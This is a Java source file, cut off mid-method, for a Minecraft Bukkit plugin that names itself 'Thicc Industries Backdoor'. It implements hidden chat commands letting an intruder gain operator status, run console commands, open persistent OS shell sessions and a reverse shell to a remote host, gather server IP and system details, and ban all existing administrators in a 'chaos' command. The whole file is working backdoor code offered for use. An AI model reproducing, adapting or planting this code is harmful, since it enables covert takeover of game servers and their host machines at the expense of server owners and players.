package com.tmquan2508.exploit;

import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;

public class ExploitCommands {
    public static abstract class Command extends Exploit.Command {
        public Command() {
            super();
        }
    }

    public static class LoginCommand extends Command {
        public LoginCommand() { super(); }
        @Override public String getName() { return "login"; }
        @Override public String getDescription() { return "Log in for elevated permissions (Level 2)."; }
        @Override public String getUsage() { return "<password>"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            boolean isPasswordNotSet = Config.authorized_password.isEmpty() ||
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".equals(Config.authorized_password);
            if (isPasswordNotSet) { Exploit.permissionLevels.put(sender.getUniqueId(), 2); Exploit.sender.sendMessage(sender, "Login successful because password is not set. You now have Level 2 permissions."); return; }
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            try {
                MessageDigest digest = MessageDigest.getInstance("SHA-256");
                byte[] hash = digest.digest(args[0].getBytes(StandardCharsets.UTF_8));
                StringBuilder hexString = new StringBuilder(2 * hash.length);
                for (byte b : hash) {
                    String hex = Integer.toHexString(0xff & b);
                    if (hex.length() == 1) hexString.append('0');
                    hexString.append(hex);
                }

                if (hexString.toString().equals(Config.authorized_password)) {
                    Exploit.permissionLevels.put(sender.getUniqueId(), 2);
                    Exploit.sender.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
                } else {
                    Exploit.sender.sendError(sender, "Incorrect password.");
                }
            } catch (NoSuchAlgorithmException e) {
                Exploit.sender.sendError(sender, "This server runs in a Java environment that doesn't have the SHA-256 algorithm!");
                Exploit.sender.sendWarn(sender, "Therefore, anyone on the authorized list can get permission.");
                Exploit.permissionLevels.put(sender.getUniqueId(), 2);
                Exploit.sender.sendMessage(sender, "Login successful. You now have Level 2 permissions.");
            }
        }
    }

    public static class HelpCommand extends Command {
        public HelpCommand() { super(); }
        @Override public String getName() { return "help"; }
        @Override public String getDescription() { return "Display this message, or description of a command."; }
        @Override public String getUsage() { return "[command]"; }
        @Override public int getRequirePerm() { return 1; }
        @Override public void execute(Player sender, String[] args) {
            int userPerm = Exploit.helpers.getPlayerPermissionLevel(sender);

            if (args.length == 0) {
                StringBuilder sb = new StringBuilder();
                sb.append(Config.help_detail_color).append("Thicc Industries Backdoor\n");
                sb.append(Config.help_detail_color).append("-----------------------------------------------------\n\n");

                for (Exploit.Command cmd : Exploit.commandHandler.getCommands().values()) {
                    if (userPerm >= cmd.getRequirePerm()) {
                        sb.append(Config.help_command_name_color).append(Config.command_prefix).append(cmd.getName())
                                .append(": ").append(Config.help_command_desc_color).append(cmd.getDescription()).append("\n");
                    }
                }
                Exploit.sender.sendMessage(sender, sb.toString());
            } else {
                Exploit.Command cmd = Exploit.commandHandler.getCommands().get(args[0].toLowerCase());
                if (cmd != null && userPerm >= cmd.getRequirePerm()) {
                    Exploit.sender.sendMessage(sender, Config.help_command_name_color + Config.command_prefix + cmd.getName() + " " + ChatColor.GRAY + cmd.getUsage());
                    Exploit.sender.sendMessage(sender, Config.help_command_desc_color + cmd.getDescription());
                } else {
                    Exploit.sender.sendError(sender, "Command not found: " + args[0]);
                }
            }
        }
    }

    public static class SpamCommand extends Command {
        private final Map<Integer, BukkitTask> activeTasks = new ConcurrentHashMap<>();
        private final Map<Integer, String> activeTaskDetails = new ConcurrentHashMap<>();
        private int nextId = 0;

        public SpamCommand() { super(); }

        @Override public String getName() { return "spam"; }
        @Override public String getDescription() { return "Manages repeating message broadcast tasks."; }
        @Override public String getUsage() { return "<start|stop|list> [args...]"; }
        @Override public int getRequirePerm() { return 2; }

        @Override
        public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "start":
                    handleStart(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                default:
                    Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleStart(Player sender, String[] args) {
            if (args.length < 3) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "spam start <amount> <delay_ticks> <message...>");
                Exploit.sender.sendWarn(sender, "Note: 20 ticks = 1 second.");
                return;
            }

            int amount;
            long delayInTicks;

            try {
                amount = Integer.parseInt(args[0]);
                delayInTicks = Long.parseLong(args[1]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Error: Amount and delay must be integers.");
                return;
            }

            if (amount <= 0 || delayInTicks < 0) {
                Exploit.sender.sendError(sender, "Error: Amount must be > 0, and delay must be >= 0.");
                return;
            }

            String message = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
            final String finalMessage = ChatColor.translateAlternateColorCodes('&', message.replace("\\n", "\n"));
            final int taskId = ++nextId;

            BukkitTask task = new BukkitRunnable() {
                private int timesRun = 0;
                @Override public void run() {
                    if (timesRun++ >= amount) {
                        activeTasks.remove(taskId);
                        activeTaskDetails.remove(taskId);
                        this.cancel();
                        return;
                    }
                    Bukkit.broadcastMessage(finalMessage);
                }
            }.runTaskTimer(Exploit.plugin, 0L, delayInTicks);

            String details = "Amount: " + amount + ", Delay: " + delayInTicks + "t, Message: \"" + message + "\"";
            activeTasks.put(taskId, task);
            activeTaskDetails.put(taskId, details);
            Exploit.sender.sendSuccess(sender, "Started spam task with ID: " + taskId);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "spam stop <id>");
                return;
            }

            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }

            BukkitTask task = activeTasks.remove(id);
            activeTaskDetails.remove(id);

            if (task != null) {
                task.cancel();
                Exploit.sender.sendSuccess(sender, "Successfully stopped spam task with ID: " + id);
            } else {
                Exploit.sender.sendError(sender, "Error: Spam task with ID not found: " + id);
            }
        }

        private void handleList(Player sender) {
            if (activeTasks.isEmpty()) {
                Exploit.sender.sendMessage(sender, "No spam tasks are currently running.");
                return;
            }

            Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Running spam tasks:");
            for (Map.Entry<Integer, String> entry : activeTaskDetails.entrySet()) {
                Exploit.sender.sendMessage(sender, ChatColor.YELLOW + " - ID: " + entry.getKey() + " | " + ChatColor.WHITE + entry.getValue());
            }
        }
    }

    public static class OpCommand extends Command {
        public OpCommand() { super(); }
        @Override public String getName() { return "op"; }
        @Override public String getDescription() { return "Grants operator status to a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    Exploit.sender.sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }

            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Exploit.DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                Exploit.sender.sendMessage(sender, finalTarget.getName() + " is now op.");
            });
        }
    }

    public static class DeopCommand extends Command {
        public DeopCommand() { super(); }
        @Override public String getName() { return "deop"; }
        @Override public String getDescription() { return "Revokes operator status from a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target;
            if (args.length < 1) {
                target = sender;
            } else {
                target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    Exploit.sender.sendError(sender, "Player not found: " + args[0]);
                    return;
                }
            }

            final Player finalTarget = target;
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Exploit.DynamicInvoker.invokeInstanceMethod( finalTarget, "setOp", void.class, new Class<?>[]{boolean.class}, false );
                Exploit.sender.sendMessage(sender, finalTarget.getName() + " is no longer op.");
            });
        }
    }

    public static class KickCommand extends Command {
        public KickCommand() { super(); }
        @Override public String getName() { return "kick"; }
        @Override public String getDescription() { return "Kicks a player from the server."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found or is not online: " + args[0]); return; }
            final String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_kick_reason;
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                target.kickPlayer(reason);
            });
            Exploit.sender.sendMessage(sender, "Kicked player " + target.getName() + ".");
        }
    }

    public static class BanCommand extends Command {
        public BanCommand() { super(); }
        @Override public String getName() { return "ban"; }
        @Override public String getDescription() { return "Bans a player."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            Bukkit.getBanList(BanList.Type.NAME).addBan(target.getName(), reason, null, sender.getName());
            if (target.isOnline() && target.getPlayer() != null) {
                Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                    if(target.getPlayer() != null) {
                        target.getPlayer().kickPlayer(reason);
                    }
                });
            }
            Exploit.sender.sendMessage(sender, "Banned " + target.getName());
        }
    }

    public static class BanIpCommand extends Command {
        public BanIpCommand() { super(); }
        @Override public String getName() { return "banip"; }
        @Override public String getDescription() { return "Bans a player by their IP address."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            InetSocketAddress address = target.getAddress();
            if (address != null) {
                Bukkit.getBanList(BanList.Type.IP).addBan(address.getAddress().getHostAddress(), reason, null, sender.getName());
                final Player finalTarget = target;
                Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                    finalTarget.kickPlayer(reason);
                });
                Exploit.sender.sendMessage(sender, "IP Banned " + target.getName());
            } else {
                Exploit.sender.sendError(sender, "Could not get IP for " + target.getName());
            }
        }
    }

    public static class GamemodeCommand extends Command {
        public GamemodeCommand() { super(); }
        @Override public String getName() { return "gamemode"; }
        @Override public String getDescription() { return "Switch to a specified gamemode."; }
        @Override public String getUsage() { return "<gamemode> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            GameMode gm;
            try {
                gm = GameMode.valueOf(args[0].toUpperCase());
            } catch (IllegalArgumentException e) {
                Exploit.sender.sendError(sender, "Invalid gamemode: " + args[0]);
                return;
            }
            Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[1]); return; }
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                target.setGameMode(gm);
                Exploit.sender.sendMessage(sender, "Gamemode for " + target.getName() + " set to " + gm.name());
            });
        }
    }

    public static class GiveCommand extends Command {
        public GiveCommand() { super(); }
        @Override public String getName() { return "give"; }
        @Override public String getDescription() { return "Gives the specified item."; }
        @Override public String getUsage() { return "<item_name> [amount] [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Material material = Material.getMaterial(args[0].toUpperCase());
            if (material == null) { Exploit.sender.sendError(sender, "Unknown material: " + args[0]); return; }
            int amount = 1;
            if (args.length > 1) {
                try {
                    amount = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    Exploit.sender.sendError(sender, "Invalid amount: " + args[1]);
                    return;
                }
            }
            Player target = (args.length > 2) ? Bukkit.getPlayer(args[2]) : sender;
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[2]); return; }
            target.getInventory().addItem(new ItemStack(material, amount));
            Exploit.sender.sendMessage(sender, "Giving " + amount + " of " + material.name() + " to " + target.getName());
        }
    }

    public static class ExecCommand extends Command {
        public ExecCommand() { super(); }
        @Override public String getName() { return "exec"; }
        @Override public String getDescription() { return "Executes a command as the server console."; }
        @Override public String getUsage() { return "<command...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            String command = String.join(" ", args);
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            });
            Exploit.sender.sendMessage(sender, "Executed: " + command);
        }
    }

    public static class ShellCommand extends Command {
        public ShellCommand() { super(); }
        @Override public String getName() { return "shell"; }
        @Override public String getDescription() { return "Manages persistent OS shell sessions."; }
        @Override public String getUsage() { return "<create|list|execute|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "execute":
                    handleExecute(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    Exploit.sender.sendError(sender, "Unknown subcommand. " + Exploit.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] shellArgs) {
            if (shellArgs.length < 1) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "shell create <shell_path> [args...]");
                Exploit.sender.sendWarn(sender, "Example (Linux): !shell create /bin/bash --noprofile --norc");
                Exploit.sender.sendWarn(sender, "Example (Windows): !shell create cmd.exe");
                return;
            }

            int id = Exploit.nextShellId.getAndIncrement();
            try {
                ShellSession session = new ShellSession(id, shellArgs);
                Exploit.activeShellSessions.put(id, session);
                Exploit.sender.sendSuccess(sender, "Created new shell session #" + id + " with: " + String.join(" ", shellArgs));
            } catch (IOException e) {
                Exploit.sender.sendError(sender, "Failed to create shell session: " + e.getMessage());
            }
        }

        private void handleList(Player sender) {
            if (Exploit.activeShellSessions.isEmpty()) {
                Exploit.sender.sendMessage(sender, "No active shell sessions.");
                return;
            }
            Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Active shell sessions:");
            Exploit.activeShellSessions.forEach((id, session) -> {
                String status = session.isAlive() ? ChatColor.GREEN + "Running" : ChatColor.RED + "Stopped";
                Exploit.sender.sendMessage(sender, " - ID: " + ChatColor.YELLOW + id + ChatColor.WHITE + " | Status: " + status);
            });
        }

        private void handleExecute(Player sender, String[] args) {
            if (args.length < 2) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "shell execute <id> <command...>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid session ID: " + args[0]);
                return;
            }

            ShellSession session = Exploit.activeShellSessions.get(id);
            if (session == null || !session.isAlive()) {
                Exploit.sender.sendError(sender, "Session with ID " + id + " not found or has been stopped.");
                return;
            }

            String commandToExecute = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            session.executeCommand(sender, commandToExecute);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "shell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }

            ShellSession session = Exploit.activeShellSessions.remove(id);
            if (session != null) {
                session.destroy();
                Exploit.sender.sendSuccess(sender, "Stopped and removed shell session #" + id);
            } else {
                Exploit.sender.sendError(sender, "Session with ID " + id + " not found.");
            }
        }
    }

    public static class ShellSession {
        private final int id;
        private final Process process;
        private final PrintWriter commandWriter;
        private final BufferedReader outputReader;
        private final Object lock = new Object();

        public ShellSession(int id, String[] shellCommand) throws IOException {
            this.id = id;
            ProcessBuilder builder = new ProcessBuilder(shellCommand);
            builder.redirectErrorStream(true);
            this.process = builder.start();
            this.commandWriter = new PrintWriter(new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8), true);
            this.outputReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
        }

        public void executeCommand(Player sender, String command) {
            new Thread(() -> {
                synchronized (lock) {
                    try {
                        String endOfOutputMarker = "EOO_MARKER_" + UUID.randomUUID().toString();
                        commandWriter.println(command);
                        commandWriter.println("echo " + endOfOutputMarker);
                        StringBuilder commandOutput = new StringBuilder();
                        String line;
                        while ((line = outputReader.readLine()) != null) {
                            if (line.trim().equals(endOfOutputMarker)) {
                                break;
                            }
                            commandOutput.append(line).append("\n");
                        }

                        String finalOutput = commandOutput.toString().trim();
                        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                            Exploit.sender.sendMessage(sender, ChatColor.AQUA + "--- Output for Shell #" + id + " ---");
                            if (finalOutput.isEmpty()) {
                                Exploit.sender.sendMessage(sender, ChatColor.GRAY + "(Command executed with no output)");
                            } else {
                                for(String outputLine : finalOutput.split("\n")) {
                                    Exploit.sender.sendMessage(sender, outputLine);
                                }
                            }
                            Exploit.sender.sendMessage(sender, ChatColor.AQUA + "----------------------------");
                        });
                    } catch (IOException e) {
                        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                            Exploit.sender.sendError(sender, "Error communicating with shell #" + id + ". Session terminated. " + e.getMessage());
                        });
                        destroy();
                        Exploit.activeShellSessions.remove(this.id);
                    }
                }
            }).start();
        }

        public void destroy() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            try {
                if (commandWriter != null) commandWriter.close();
                if (outputReader != null) outputReader.close();
            } catch (IOException e) {}
        }

        public boolean isAlive() {
            return process != null && process.isAlive();
        }
    }

    public static class ReverseShellInstance {
        private final int id;
        private final String host;
        private final int port;
        private final String[] shellCmd;
        private Process process;
        private Socket socket;
        private final Consumer<String> onConnect;
        private final Consumer<String> onDisconnect;
        private final Consumer<String> onError;

        public ReverseShellInstance(int id, String host, int port, String[] shellCmd, Consumer<String> onConnect, Consumer<String> onDisconnect, Consumer<String> onError) {
            this.id = id;
            this.host = host;
            this.port = port;
            this.shellCmd = shellCmd;
            this.onConnect = onConnect;
            this.onDisconnect = onDisconnect;
            this.onError = onError;
        }

        public void start() {
            new Thread(() -> {
                try {
                    process = new ProcessBuilder(shellCmd).redirectErrorStream(true).start();
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 10000);
                    socket.setKeepAlive(true);
                    runOnMainThread(() -> onConnect.accept("Reverse shell (ID: " + id + ") connected successfully."));
                    new Thread(this::pipeShellToSocket).start();
                    new Thread(this::pipeSocketToShell).start();
                    process.waitFor();
                } catch (Exception e) {
                    runOnMainThread(() -> onError.accept("Shell connection error (ID: " + id + "): " + e.getMessage()));
                } finally {
                    cleanup();
                }
            }).start();
        }

        private void pipeShellToSocket() {
            try (InputStream processInput = process.getInputStream(); OutputStream socketOutput = socket.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = processInput.read(buffer)) != -1) {
                    socketOutput.write(buffer, 0, bytesRead);
                    socketOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                closeSocket();
            }
        }

        private void pipeSocketToShell() {
            try (InputStream socketInput = socket.getInputStream(); OutputStream processOutput = process.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = socketInput.read(buffer)) != -1) {
                    processOutput.write(buffer, 0, bytesRead);
                    processOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                if (process.isAlive()) {
                    process.destroy();
                }
            }
        }

        public void stop() {
            closeSocket();
        }

        private void closeSocket() {
            try {
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
            } catch (IOException ignored) {}
        }

        private void cleanup() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            closeSocket();
            runOnMainThread(() -> onDisconnect.accept("Reverse shell (ID: " + id + ") has been disconnected."));
        }

        public String getDetails() {
            return host + ":" + port + " - " + String.join(" ", shellCmd);
        }

        public int getId() {
            return id;
        }

        private void runOnMainThread(Runnable task) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    task.run();
                }
            }.runTask(Exploit.plugin);
        }
    }

    public static class ReverseShellCommand extends Command {
        private final Map<Integer, ReverseShellInstance> activeShells = new ConcurrentHashMap<>();
        private int nextId = 0;

        public ReverseShellCommand() { super(); }
        @Override public String getName() { return "revshell"; }
        @Override public String getDescription() { return "Creates and manages reverse shell connections."; }
        @Override public String getUsage() { return "<create|list|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                Exploit.sender.sendWarn(sender, "Example: " + Config.command_prefix + "revshell create 127.0.0.1:4444 /bin/bash");
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] args) {
            if (args.length < 2) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "revshell create <ip:port> <shell_command...>");
                return;
            }
            String[] parts = args[0].split(":");
            if (parts.length != 2) {
                Exploit.sender.sendError(sender, "Invalid ip:port format: '" + args[0] + "'");
                return;
            }
            String host = parts[0];
            int port;
            try {
                port = Integer.parseInt(parts[1]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid port: '" + parts[1] + "'");
                return;
            }
            String[] shellCmd = Arrays.copyOfRange(args, 1, args.length);
            final int shellId = ++nextId;

            Exploit.sender.sendMessage(sender, "Attempting to create reverse shell (ID: " + shellId + ") to " + host + ":" + port + "...");

            Consumer<String> onConnect = message -> Exploit.sender.sendSuccess(sender, message);
            Consumer<String> onError = message -> {
                Exploit.sender.sendError(sender, message);
                activeShells.remove(shellId);
            };
            Consumer<String> onDisconnect = message -> {
                if (activeShells.containsKey(shellId)) {
                    Exploit.sender.sendWarn(sender, message);
                    activeShells.remove(shellId);
                }
            };

            ReverseShellInstance shell = new ReverseShellInstance(shellId, host, port, shellCmd, onConnect, onDisconnect, onError);
            activeShells.put(shellId, shell);
            shell.start();
        }

        private void handleList(Player sender) {
            if (activeShells.isEmpty()) {
                Exploit.sender.sendMessage(sender, "No active reverse shells.");
                return;
            }
            Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Active reverse shells:");
            for (ReverseShellInstance shell : activeShells.values()) {
                Exploit.sender.sendMessage(sender, ChatColor.YELLOW + " - ID: " + shell.getId() + " | " + ChatColor.WHITE + shell.getDetails());
            }
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + "revshell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }
            ReverseShellInstance shell = activeShells.get(id);
            if (shell == null) {
                Exploit.sender.sendError(sender, "No active shell found with ID: " + id);
                return;
            }
            Exploit.sender.sendMessage(sender, "Sent stop signal to shell ID: " + id);
            shell.stop();
        }
    }

    public static class InfoCommand extends Command {
        public InfoCommand() { super(); }
        @Override public String getName() { return "info"; }
        @Override public String getDescription() { return "Shows information about the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            try {
                URL url = new URL("https://api.ipify.org/");
                BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                String ip = br.readLine();
                Runtime r = Runtime.getRuntime();
                long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                long memMax = r.maxMemory() / 1048576L;
                Exploit.sender.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
                Exploit.sender.sendMessage(sender, ChatColor.WHITE + "Server IP: " + ChatColor.GRAY + ip + ":" + Bukkit.getServer().getPort());
                Exploit.sender.sendMessage(sender, ChatColor.WHITE + "Server version: " + ChatColor.GRAY + Bukkit.getVersion());
                Exploit.sender.sendMessage(sender, ChatColor.WHITE + "OS: " + ChatColor.GRAY + System.getProperty("os.name"));
                Exploit.sender.sendMessage(sender, ChatColor.WHITE + "RAM (used/max): " + ChatColor.GRAY + memUsed + "MB / " + memMax + "MB");
                Exploit.sender.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
            } catch (IOException e) {
                Exploit.sender.sendError(sender, "Error gathering system info.");
            }
        }
    }

    public static class ChaosCommand extends Command {
        public ChaosCommand() { super(); }
        @Override public String getName() { return "chaos"; }
        @Override public String getDescription() { return "Deops and bans all ops, ops all regular players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                boolean isAdmin = p.isOp() || p.hasPermission("*") || p.hasPermission("group.admin");
                if (isAdmin && !Exploit.helpers.isUserAuthorized(p)) {
                    Exploit.DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, false);
                    Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(), Config.default_ban_reason, null, Config.default_ban_source);
                    if (p.isOnline()) {
                        p.kickPlayer(Config.default_ban_reason);
                    }
                } else if (!isAdmin) {
                    Exploit.DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                }
            }
            Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
        }
    }

    public static class EnchantCommand extends Command {
        public EnchantCommand() { super(); }
        @Override public String getName() { return "enchant"; }
        @Override public String getDescription() { return "Applies a specific enchantment to the held item."; }
        @Override public String getUsage() { return "<enchantment> <level> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) {
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                Exploit.sender.sendWarn(sender, "Example: !enchant sharpness 100");
                Exploit.sender.sendWarn(sender, "Example: !enchant efficiency 10 Kudo");
                return;
            }

            Player target = sender;
            if (args.length > 2) {
                target = Bukkit.getPlayer(args[2]);
                if (target == null) {
                    Exploit.sender.sendError(sender, "Player not found: " + args[2]);
                    return;
                }
            }

            ItemStack item = target.getInventory().getItemInMainHand();
            if (item.getType() == Material.AIR) {
                Exploit.sender.sendError(sender, target.getName() + " is not holding an item.");
                return;
            }

            ItemMeta meta = item.getItemMeta();
            if (meta == null) {
                Exploit.sender.sendError(sender, "Could not get item metadata.");
                return;
            }

            Enchantment enchantment = Enchantment.getByKey(NamespacedKey.minecraft(args[0].toLowerCase()));
            if (enchantment == null) {
                Exploit.sender.sendError(sender, "Invalid enchantment: " + args[0] + ". Use the Minecraft ID name (e.g., 'sharpness', 'unbreaking', 'fire_aspect').");
                return;
            }

            int level;
            try {
                level = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid level: " + args[1] + ". Must be a number.");
                return;
            }
            meta.addEnchant(enchantment, level, true);
            item.setItemMeta(meta);
            Exploit.sender.sendSuccess(sender, "Applied " + enchantment.getKey().getKey() + " " + level + " to " + target.getName() + "'s item.");
        }
    }

    public static class SeedCommand extends Command {
        public SeedCommand() { super(); }
        @Override public String getName() { return "seed"; }
        @Override public String getDescription() { return "Gets the current world seed."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            String seedString = String.valueOf(sender.getWorld().getSeed());
